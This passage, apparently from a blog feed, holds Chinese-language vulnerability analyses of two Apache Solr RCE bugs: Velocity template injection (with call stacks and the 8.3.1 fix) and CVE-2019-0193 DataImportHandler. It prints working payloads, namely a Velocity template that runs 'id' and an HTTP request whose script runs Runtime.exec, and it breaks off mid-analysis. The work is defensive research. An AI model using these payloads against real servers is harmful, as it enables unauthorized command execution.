class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))+$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream()) </span><br><span class="line">#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Solr&lt;=8.2.0 且core允许velocity模板。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="solr-core-config"><a href="#solr-core-config" class="headerlink" title="/solr/{core}/config"></a>/solr/{core}/config</h2><p>还是跟上次一样，断点下在org.apache.solr.servlet.HttpSolrCall#call:519这里，调试第一个请求，还是通过如下调用栈，交给handler处理请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.solr.servlet.HttpSolrCall#call:542</span><br><span class="line">  org.apache.solr.servlet.HttpSolrCall#execute():756</span><br><span class="line">    org.apache.solr.core.SolrCore#execute:2566</span><br><span class="line">      org.apache.solr.request.SolrRequestHandler#handleRequest:199</span><br><span class="line">        org.apache.solr.handler.SolrConfigHandler#handleRequestBody</span><br></pre></td></tr></table></figure><p>可以看到，这此处理的handler是SolrConfigHandler，其将接受的post参数创建为command对象（129行），然后调用它的handlePOST()方法：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175443383.png" alt="image-20191124175443383"></p><p>handlePOST()方法如下，其获取command的操作，以及需要覆盖的原配置，调Command#handleCommands：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124175720679.png" alt="image-20191124175720679"></p><p>Command#handleCommands(ops, overlay)，其是一个switch-case结构，这里走的是默认分支，然后调用Command#updateNamedPlugin更新之前的配置（overlay变量），再将配置保存到zk或者本地：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleCommands</span><span class="params">(List&lt;CommandOperation&gt; ops, ConfigOverlay overlay)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (CommandOperation op : ops) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (op.name) &#123;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">        <span class="keyword">default</span>: &#123;</span><br><span class="line">          List&lt;String&gt; pcs = StrUtils.splitSmart(op.name.toLowerCase(Locale.ROOT), <span class="string">'-'</span>);</span><br><span class="line">          <span class="keyword">if</span> (pcs.size() != <span class="number">2</span>) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String prefix = pcs.get(<span class="number">0</span>);</span><br><span class="line">            String name = pcs.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmdPrefixes.contains(prefix) &amp;&amp; namedPlugins.containsKey(name)) &#123;</span><br><span class="line">              SolrConfig.SolrPluginInfo info = namedPlugins.get(name);</span><br><span class="line">              <span class="keyword">if</span> (<span class="string">"delete"</span>.equals(prefix)) &#123;</span><br><span class="line">                overlay = deleteNamedComponent(op, overlay, info.getCleanTag());</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                overlay = updateNamedPlugin(info, op, overlay, prefix.equals(<span class="string">"create"</span>) || prefix.equals(<span class="string">"add"</span>)); <span class="comment">//这里更新配置（overlay变量）</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              op.unknownOperation();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    List errs = CommandOperation.captureErrors(ops);</span><br><span class="line">    <span class="keyword">if</span> (!errs.isEmpty()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    SolrResourceLoader loader = req.getCore().getResourceLoader();</span><br><span class="line">    <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> ZkSolrResourceLoader) &#123;<span class="comment">/*...*/</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      SolrResourceLoader.persistConfLocally(loader, ConfigOverlay.RESOURCE_NAME, overlay.toByteArray()); <span class="comment">// 将配置保存到本地</span></span><br><span class="line">      req.getCore().getCoreContainer().reload(req.getCore().getName()); <span class="comment">// 更新配置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>28行（实际代码504行）会将配置保存到本地，也就是<code>{core}/conf/configoverlay.json</code>文件了。</p><p>那么总结一下调用栈就是：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124181632402.png" alt="image-20191124181632402"></p><h2 id="solr-core-select"><a href="#solr-core-select" class="headerlink" title="/solr/{core}/select"></a>/solr/{core}/select</h2><p> 这个API原先应该是数据库查询用的，但现在由于允许了执行参数中指定的velocity，造成了SSTI，我们重新看一下org.apache.solr.servlet.HttpSolrCall#call方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();<span class="comment">//VelocityResopnseWriter</span></span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod); <span class="comment">//SSTI</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) <span class="comment">/*...*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引发SSTI的关键在于第26行（源程序第556行），其调用了HttpSolrCall#getResponseWriter，获取到VelocityResponseWriter，和30行（源程序558行），其会通过HttpSolrCall#writeResponse将Request中参数渲染到页面。</p><p>先看HttpSolrCall#getResponseWriter：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184425485.png" alt="image-20191124184425485"></p><p>逻辑很简单，就是从参数<code>wt</code>中获取模板，然后返回对应模板——注意到PoC中的<code>wt=velocity</code></p><p>再看HttpSolrCall#writeResponse：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124184911792.png" alt="image-20191124184911792"></p><p>其调用了QueryResponseWriterUtil#writeQueryResponse()，将solrReq，solrRsp写成HTTP Response，ct是content-type。</p><p>HttpSolrCall#writeResponse()调用QueryResponseWriterUtil#writeQueryResponse()，先生产一个OutputStreamWriter，然后用responseWriter写入内容：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124185248960.png" alt="image-20191124185248960"></p><p>再跟进去就到了VelocityResponseWriter#write：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124190358485.png" alt="image-20191124190358485"></p><h3 id="VelocityResponseWriter-createEngine"><a href="#VelocityResponseWriter-createEngine" class="headerlink" title="VelocityResponseWriter#createEngine"></a>VelocityResponseWriter#createEngine</h3><p>在VelocityResponseWriter#createEngine中，如果<code>paramsResourceLoaderEnabled</code>，那么<code>params.resource.loader.instance=new SolrParamResourceLoader(request)</code>，如果<code>solrResourceLoaderEnabled</code>，那么<code>solr.resource.loader.instance=solrResourceLader</code></p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124210507568.png" alt="image-20191124210507568"></p><p>先看第一个if——<code>SolrParamResourceLoader(request)</code>这个构造函数，其会将请求中的<code>v.template</code>开头的参数名截取剩下的部分+“.vm”作为key——注意到PoC中的<code>v.template.custom=%23set($x=%27%27)...</code>，截取后得到<code>custom</code>+<code>.vm</code>=<code>custom.vm</code>，而请求中参数内容作为template，因此由于这个而参数时攻击者可以控制的——例如在PoC中，将内容设置为了<code>%23set($x=%27%27)...</code>，因此造成SSTI：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png" alt="image-20191124211628918"></p><p>再看第二个if——<code>SolrVelocityResourceLoader()</code>其任务是加载一个有velocity classpath的ResourceLoader：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png" alt="image-20191124212157913"></p><h3 id="VelocityResponseWriter-getTemplate"><a href="#VelocityResponseWriter-getTemplate" class="headerlink" title="VelocityResponseWriter#getTemplate"></a>VelocityResponseWriter#getTemplate</h3><p>回到VelocityResponseWriter#write，在VelocityResponseWriter#getTemplate时，会从请求v.template参数中获取模板的名称，即PoC中的<code>v.template=custom</code>，再走到<code>engine.getTemplate(templateName + TEMPLATE_EXTENSION)</code>获取template，即前面设置的<code>custom.vm</code>：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png" alt="image-20191124205548129"></p><p>模板解释发生在<code>org.apache.velocity.Template#merge(Context, Writer)</code>，后面就是Velocity模板解释逻辑了，不再跟。</p><p>总结一下调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">558</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">writeResponse:<span class="number">849</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">  writeQueryResponse:<span class="number">65</span>, QueryResponseWriterUtil (org.apache.solr.response)</span><br><span class="line">    write:<span class="number">150</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      createEngine:<span class="number">313</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">        SolrParamResourceLoader()<span class="comment">//设置params.resource.loader——custom.vm模板</span></span><br><span class="line">      createEngine:<span class="number">324</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">//设置solr.resource.loader——加载velocity lib</span></span><br><span class="line">    write:<span class="number">152</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      getTemplate:<span class="number">372</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">// 获取模板</span></span><br><span class="line">    write:<span class="number">166</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      merge:<span class="number">264</span>, Template (org.apache.velocity) <span class="comment">// 模板渲染，RCE</span></span><br><span class="line">        merge:<span class="number">359</span>, Template (org.apache.velocity)</span><br><span class="line">          render:<span class="number">376</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><p>下载v8.3.1的solr，发送PoC后可以看到报错了：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png" alt="image-20191208165035876"></p><p>从报错内容上看，solr没获取到custom.vm模板，那再参考之前分析，应该是VelocityResponseWriter#createEngine做了修改，但是调试后发现这里并没修改，只是两个if判断都为false了，paramsResourceLoaderEnabled和solrResourceLoaderEnabled都是false：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png" alt="image-20191208172313550"></p><p>经过调试，可以找到VelocityResponseWriter的构造调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init:<span class="number">110</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">initInstance:<span class="number">104</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">createInst:<span class="number">443</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">415</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">168</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">get:<span class="number">178</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">getQueryResponseWriter:<span class="number">2753</span>, SolrCore (org.apache.solr.core)</span><br><span class="line">getResponseWriter:<span class="number">788</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">556</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br></pre></td></tr></table></figure><p>在init()中可以看到enabled的值取决于<code>PARAMS_RESOURCE_LOADER_ENABLED</code>和<code>SOLR_RESOURCE_LOADER_ENABLED</code>，注意这里的获取方式：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png" alt="image-20191208200421304"></p><p>对比下面的v8.3.1版本：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png" alt="image-20191208194710665"></p><p><code>Boolean.getBoolean()</code>是从系统变量里面拿参数，所以PoC的第一个包（0x01步）的设置没有用。即官方修复方案选择在PoC的第一步修复，即加载配置不从solr中加载而是从系统配置中加载，以此导致第二步中的模板不可控，PoC失效。</p><h1 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h1><p>因为涉及的变量和条件太多了，感觉白盒即使用污点传播也很难发现bug，另外，如果要用污点传播，最好能加上反向传播，这样才能识别官方的修复方案。</p><p>黑盒检测的话就看包发的那几个变量就可以了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又补上了一个史前的坑，这次solr的漏洞出发过程比较复杂，导致白盒很难检测，日后可以思考如何解决这一类漏洞。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li>漏洞分析 - Apache Solr 模版注入漏洞(RCE) ，<a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a> </li><li>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></li><li>Raw Poc，<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Solr </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析</title>
      <link href="/vulnresearch-Solr_DataImportHandler_RCE/"/>
      <url>/vulnresearch-Solr_DataImportHandler_RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a><p>运行远程调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #一定要在server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><p>访问 <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> 出现控制台说明服务启动成功</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>发送payload(注意tika是demo中存在的core，需要针对其他站点做变动)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  function func(x)&#123;</span><br><span class="line">  java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  &#125; </span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>能弹计算器说明payload生效。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>先了解下<code>/solr/{core}/dataimport</code>，该API的作用是将数据全量/增量导入到solr中，更详细解释在：</p><ul><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li><li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li></ul><p>其中看到payload中需要的字段有：</p><ul><li>dataSource：数据源，有以下几种类型，每种类型有自己不同的属性<ul><li>JdbcDataSource：数据库源</li><li>URLDataSource：通常与XPathEntityProcessor配合使用，可以使用file://、http://、                          ftp://等协议获取文本数据源</li><li>HttpDataSource：与URLDataSource一样，只是名字不同</li><li>FileDataSource：从磁盘文件获取数据源</li><li>FieldReaderDataSource：如果字段包含xml信息时，可以使用这个配合XPathEntityProcessor                                使用</li><li>ContentStreamDataSource：使用post数据作为数据源，可与任何EntityProcessor配合使用</li></ul></li><li>Entity：实体，相当于将数据源的操作的数据封装成一个Java对象，字段就对应对象属性，对于xml/http数据源的实体可以在默认属性之上具有以下属性：<ul><li>url（必须）：用于调用REST API的URL。（可以模板化）。如果数据源是文件，则它必须是文件位置</li><li>processor（必须）：值必须是 “XPathEntityProcessor”</li><li>forEach（必须）：划分记录的xpath表达式。如果有多种类型的记录用“|”（管道）分隔它们。如果                         useSolrAddSchema设置为’true’，则可以省略</li><li>stream （可选）：如果xml非常大，则将此值设置为true</li></ul></li></ul><h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>从datasource变为entity存在转换(Transform)，而dataconfig中可以使用javascript写转化逻辑，例如官网中给的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这也是造成本次rce的sink点了。</p><h3 id="Nashorn-解析"><a href="#Nashorn-解析" class="headerlink" title="Nashorn 解析"></a>Nashorn 解析</h3><p>在<code>&lt;script&gt;</code>标签中，定义了js脚本，其背后是通过Nashorn做解析的，具体来说，其可以使用js语法，引用java中的对象，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="静态分析入口点"><a href="#静态分析入口点" class="headerlink" title="静态分析入口点"></a>静态分析入口点</h2><p>先拖下对应版本的源代码（<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）</a></p><p>找<code>/solr/{core}/dataimport</code>的入口，在<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>看filter：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 